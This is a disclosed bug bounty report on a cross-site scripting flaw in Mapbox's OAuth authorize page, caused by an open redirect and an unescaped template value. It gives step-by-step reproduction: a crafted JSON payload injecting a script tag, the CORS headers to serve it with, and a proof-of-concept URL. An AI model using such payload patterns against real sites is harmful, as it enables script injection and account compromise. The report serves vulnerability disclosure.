# XSS on www.mapbox.com/authorize/ because of open redirect at /core/oauth/auth

## Report Details
- **Report ID**: 143240
- **URL**: https://hackerone.com/reports/143240
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-06-05T20:23:44.276Z
- **Disclosed**: 2017-08-14T17:19:31.620Z

## Reporter
- **Username**: stefanovettorazzi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mapbox

## Vulnerability Information
Description
---
When you load the endpoint https://www.mapbox.com/authorize/ a GET request is made to the endpoint https://www.mapbox.com/core/oauth/auth with the parameters passed in the request to https://www.mapbox.com/authorize/. 
If you only send the parameter __redirect_uri__ in the request to https://www.mapbox.com/core/oauth/auth, the response from the server is a 302 redirect to the value passed in the parameter __redirect_uri__.
If the response from the latest request (after the redirect) is valid like:
```json
{
  "authorize_url": "/authrozie/...",
  "stage": "authorize",
  "user": {
    "name": "some-name",
    "extraTm2z": 1
  },
  "origin": ""
}
```
the content is used to render the template __template-modal-oauth__ in https://www.mapbox.com/authorize/.

The problem is that the value of the property `"authorize_url"` is not escaped when passed to the template
```html
<form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' class='col6 modal-body fill-white'>
...
```
which allows to break the `<form>` using `'>` and insert HTML and Javascript code.

Reproduction steps
---
1. Create a file with this content in a server that supports __https://__

      ```json
      {
        "authorize_url": "'><script>alert(document.domain);</script>",
        "stage": "authorize",
        "user": {
          "name": "nombre",
          "extraTm2z": 1
       },
       "origin": ""
     }
     ```

2. Set these headers to be returned in the response when serving the file (I don't specify how because it varies from server to server and language)

      ```
      Access-Control-Allow-Origin: https://www.mapbox.com
      Access-Control-Allow-Credentials: true
      Access-Control-Allow-Headers: x-requested-with
      ```

3. Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge

      ```
      https://www.mapbox.com/authorize/?redirect_uri=[url_to_file_created_in_step_1]
      ```

4. `alert(document.domain)` is executed

Proof of concept
---
Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge
```
https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json
```

I'm going to do a screen recording and upload it.

## Attachments
No attachments
